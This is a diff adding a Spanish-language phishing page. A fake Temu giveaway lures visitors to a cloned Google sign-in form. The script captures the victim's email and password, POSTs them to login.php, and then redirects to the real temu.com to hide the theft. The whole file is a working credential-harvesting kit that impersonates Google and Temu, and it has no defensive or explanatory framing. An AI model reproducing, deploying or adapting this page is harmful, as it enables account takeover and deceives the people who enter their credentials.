@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oferta Especial Temu</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --primary: #FF6B6B;
+            --secondary: #4ECDC4;
+            --dark: #292F36;
+            --light: #F7FFF7;
+            --accent: #FFE66D;
+            --google-blue: #1a73e8;
+            --google-gray: #5f6368;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #202124;
+            font-size: 14px;
+            line-height: 1.4286;
+        }
+        
+        /* Contenedor principal */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 40px);
+        }
+        
+        /* Estilos para la página de oferta */
+        .offer-container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+            position: relative;
+        }
+        
+        .offer-container:hover {
+            transform: translateY(-5px);
+        }
+        
+        .offer-header {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .offer-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+        
+        .google-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            color: var(--dark);
+            border: none;
+            border-radius: 50px;
+            padding: 12px 25px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 0 auto;
+            width: 90%;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .google-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+        
+        .google-btn i {
+            margin-right: 10px;
+            color: #4285F4;
+            font-size: 18px;
+        }
+        
+        .offer-price {
+            margin-top: 20px;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .offer-badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        .offer-divider {
+            height: 10px;
+            background: repeating-linear-gradient(
+                45deg,
+                var(--light),
+                var(--light) 5px,
+                rgba(0,0,0,0.05) 5px,
+                rgba(0,0,0,0.05) 10px
+            );
+            border: none;
+            margin: 0;
+        }
+        
+        .offer-content {
+            padding: 25px;
+        }
+        
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--dark);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .discount-badge {
+            background: var(--accent);
+            color: var(--dark);
+            font-size: 12px;
+            font-weight: 700;
+            padding: 3px 8px;
+            border-radius: 4px;
+            margin-left: 10px;
+        }
+        
+        .product-card {
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .product-card:hover {
+            border-color: var(--secondary);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        
+        .product-title {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 8px;
+            color: var(--dark);
+        }
+        
+        .product-desc {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        .product-stats {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        
+        .product-price {
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        .product-sales {
+            color: #888;
+        }
+        
+        .product-rating {
+            color: var(--accent);
+            letter-spacing: 2px;
+        }
+        
+        .rating-count {
+            color: #888;
+            margin-left: 5px;
+        }
+        
+        .offer-footer {
+            text-align: center;
+            padding: 20px;
+            background: #f9f9f9;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .temu-logo {
+            width: 80px;
+            margin-bottom: 10px;
+        }
+        
+        .limited-time {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--primary);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        /* Estilos para la página de login de Google */
+        .login-container {
+            width: 100%;
+            max-width: 448px;
+            background: white;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none; /* Inicialmente oculto */
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .logo img {
+            width: 75px;
+            height: 24px;
+        }
+        
+        .heading {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .heading h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            color: #202124;
+            margin-bottom: 8px;
+            padding-top: 6px;
+        }
+        
+        .heading h2 {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            letter-spacing: 0.1px;
+            line-height: 1.5;
+        }
+        
+        .input-container {
+            width: 100%;
+            margin-bottom: 4px;
+        }
+        
+        .input-field {
+            width: 100%;
+            height: 54px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.1s;
+        }
+        
+        .input-field:focus {
+            border: 2px solid var(--google-blue);
+            padding: 12px 14px;
+        }
+        
+        .link {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 14px;
+            letter-spacing: 0.25px;
+        }
+        
+        .link:hover {
+            text-decoration: underline;
+        }
+        
+        .small-link {
+            font-size: 12px;
+            margin-top: 6px;
+            display: inline-block;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 10px;
+        }
+        
+        .checkbox-container input {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            accent-color: var(--google-blue);
+        }
+        
+        .buttons-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 26px;
+        }
+        
+        .btn {
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            height: 36px;
+            min-width: 88px;
+            padding: 0 24px;
+            letter-spacing: 0.25px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            transition: background-color 0.1s;
+        }
+        
+        .btn-primary:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+        }
+        
+        .btn-secondary {
+            color: var(--google-blue);
+            background: none;
+            border: none;
+            padding-left: 6px;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #f6f9fe;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: #dadce0;
+            margin: 24px 0;
+            border: none;
+        }
+        
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 448px;
+            margin-top: 24px;
+            padding: 0 40px;
+            color: var(--google-gray);
+            font-size: 12px;
+            line-height: 1.4;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+        
+        .footer-links a {
+            color: var(--google-gray);
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .email-display {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #f1f3f4;
+            border-radius: 18px;
+            padding: 6px 12px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        
+        .email-display span {
+            font-weight: 500;
+            color: #202124;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            padding-right: 10px;
+        }
+        
+        .page {
+            display: none;
+            width: 100%;
+        }
+        
+        .active {
+            display: block;
+        }
+        
+        .info-text {
+            color: var(--google-gray);
+            font-size: 14px;
+            line-height: 1.4286;
+            margin-top: 32px;
+        }
+        
+        .language-selector {
+            display: flex;
+            align-items: center;
+        }
+        
+        /* Estilos para el estado de carga */
+        .btn-loading {
+            position: relative;
+            pointer-events: none;
+        }
+        
+        .btn-loading::after {
+            content: "";
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            border: 3px solid transparent;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: button-loading-spinner 1s ease infinite;
+        }
+        
+        @keyframes button-loading-spinner {
+            from {
+                transform: rotate(0turn);
+            }
+            to {
+                transform: rotate(1turn);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Página de oferta -->
+        <div id="offer-page" class="offer-container">
+            <div class="limited-time">¡Oferta limitada!</div>
+            
+            <div class="offer-header">
+                <h2 class="offer-title">Inicia Sesión con tu cuenta de Google para ganar esta increíble oferta en Temu</h2>
+                <button id="google-login-btn" class="google-btn">
+                    <i class="fab fa-google"></i> Continuar con Google
+                </button>
+                <div class="offer-price">USD$200</div>
+                <span class="offer-badge">Kit de cupones premium</span>
+            </div>
+            
+            <hr class="offer-divider">
+            
+            <div class="offer-content">
+                <h3 class="section-title">
+                    Icomanías de vinilo Tenerías
+                    <span class="discount-badge">39% OFF</span>
+                </h3>
+                
+                <div class="product-card">
+                    <div class="product-title">Kit de cupones exclusivo</div>
+                    <div class="product-desc">
+                        Iphone 15 pro Max <br>
+                        Incluye 5 cupones de descuento
+                    </div>
+                    <div class="product-stats">
+                        <div>
+                            <span class="product-price">2,044 $</span>
+                            <span class="product-sales">+94.137 ventas</span>
+                        </div>
+                        <div>
+                            <span class="product-rating">★★★★</span>
+                            <span class="rating-count">6</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="offer-footer">
+                <img src="https://logodownload.org/wp-content/uploads/2024/10/temu-logo-0.png" alt="Temu" class="temu-logo">
+                <p>Oferta válida por tiempo limitado</p>
+            </div>
+        </div>
+        
+        <!-- Página de login de Google -->
+        <div id="login-page" class="login-container">
+            <div id="email-page" class="page active">
+                <div class="logo">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+                </div>
+                
+                <div class="heading">
+                    <h1>Acceder a Chrome</h1>
+                    <h2>Accede a tu cuenta de Google para que tus favoritos, contraseñas, historial y otras opciones de configuración estén en todos tus dispositivos</h2>
+                </div>
+                
+                <div class="input-container">
+                    <input type="email" id="email" class="input-field" placeholder="Correo electrónico o teléfono" autofocus required>
+                </div>
+                
+                <div>
+                    <a href="#" class="link small-link">¿Olvidaste el correo electrónico?</a>
+                </div>
+                
+                <div class="info-text">
+                    ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. <a href="#" class="link">Más información para usar el modo de invitado</a>
+                </div>
+                
+                <div class="buttons-container">
+                    <button class="btn btn-secondary" id="create-account">Crear cuenta</button>
+                    <button class="btn btn-primary" id="next-email">Siguiente</button>
+                </div>
+            </div>
+            
+            <div id="password-page" class="page">
+                <div class="logo">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+                </div>
+                
+                <div class="heading">
+                    <h1>Te damos la bienvenida</h1>
+                </div>
+                
+                <div class="email-display">
+                    <span id="display-email">user@example.com</span>
+                    <a href="#" class="link" id="change-email">Cambiar</a>
+                </div>
+                
+                <div class="input-container">
+                    <input type="password" id="password" class="input-field" placeholder="Ingresa tu contraseña" autofocus required minlength="6">
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="show-password">
+                    <label for="show-password">Mostrar contraseña</label>
+                </div>
+                
+                <div>
+                    <a href="#" class="link small-link">¿Olvidaste la contraseña?</a>
+                </div>
+                
+                <div class="buttons-container">
+                    <button class="btn btn-secondary" id="forgot-password">¿Olvidaste la contraseña?</button>
+                    <button class="btn btn-primary" id="next-password">Siguiente</button>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <div class="language-selector">
+                    <span>Español (Latinoamérica)</span>
+                    <span>▼</span>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Ayuda</a>
+                    <a href="#">Privacidad</a>
+                    <a href="#">Condiciones</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elementos del DOM
+            const googleLoginBtn = document.getElementById('google-login-btn');
+            const offerPage = document.getElementById('offer-page');
+            const loginPage = document.getElementById('login-page');
+            
+            // Elementos del formulario de Google
+            const emailPage = document.getElementById('email-page');
+            const passwordPage = document.getElementById('password-page');
+            const emailInput = document.getElementById('email');
+            const displayEmail = document.getElementById('display-email');
+            const nextEmailBtn = document.getElementById('next-email');
+            const changeEmailBtn = document.getElementById('change-email');
+            const passwordInput = document.getElementById('password');
+            const showPasswordCheckbox = document.getElementById('show-password');
+            const nextPasswordBtn = document.getElementById('next-password');
+            
+            // Mostrar formulario de Google al hacer clic
+            googleLoginBtn.addEventListener('click', function() {
+                offerPage.style.display = 'none';
+                loginPage.style.display = 'block';
+                emailInput.focus();
+            });
+            
+            // Ir a la página de contraseña
+            nextEmailBtn.addEventListener('click', async function() {
+                const email = emailInput.value.trim();
+                
+                if (email !== '') {
+                    displayEmail.textContent = email;
+                    emailPage.classList.remove('active');
+                    passwordPage.classList.add('active');
+                    passwordInput.focus();
+                } else {
+                    emailInput.focus();
+                    alert('Por favor ingresa un correo electrónico válido');
+                }
+            });
+            
+            // Volver a la página de email
+            changeEmailBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordPage.classList.remove('active');
+                emailPage.classList.add('active');
+                emailInput.focus();
+            });
+            
+            // Mostrar/ocultar contraseña
+            showPasswordCheckbox.addEventListener('change', function() {
+                passwordInput.type = this.checked ? 'text' : 'password';
+            });
+            
+            // Permitir Enter para avanzar
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    nextEmailBtn.click();
+                }
+            });
+            
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    nextPasswordBtn.click();
+                }
+            });
+            
+            // Botón "Crear cuenta"
+            document.getElementById('create-account').addEventListener('click', function() {
+                alert('Redirigiendo a creación de cuenta...');
+            });
+            
+            // Botón "¿Olvidaste la contraseña?"
+            document.getElementById('forgot-password').addEventListener('click', function() {
+                alert('Redirigiendo a recuperación de contraseña...');
+            });
+            
+            // Función para enviar datos al servidor y redirigir
+            nextPasswordBtn.addEventListener('click', async function() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                if (email && password) {
+                    try {
+                        // Mostrar estado de carga
+                        this.classList.add('btn-loading');
+                        this.disabled = true;
+                        
+                        // Enviar datos al servidor
+                        const response = await fetch('login.php', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                            },
+                            body: new URLSearchParams({
+                                email: email,
+                                password: password
+                            })
+                        });
+                        
+                        const result = await response.json();
+                        
+                        if (result.status === 'success') {
+                            // Redirigir a Temu después de 2 segundos
+                            setTimeout(() => {
+                                window.location.href = 'https://www.temu.com';
+                            }, 2000);
+                            
+                            // Mostrar mensaje de éxito
+                            alert('¡Inicio de sesión exitoso! Redirigiendo a Temu...');
+                        } else {
+                            alert(result.message || 'Error al registrar el usuario');
+                            this.classList.remove('btn-loading');
+                            this.disabled = false;
+                        }
+                    } catch (error) {
+                        console.error('Error:', error);
+                        alert('Error de conexión con el servidor');
+                        this.classList.remove('btn-loading');
+                        this.disabled = false;
+                    }
+                } else {
+                    alert('Por favor ingresa email y contraseña válidos');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
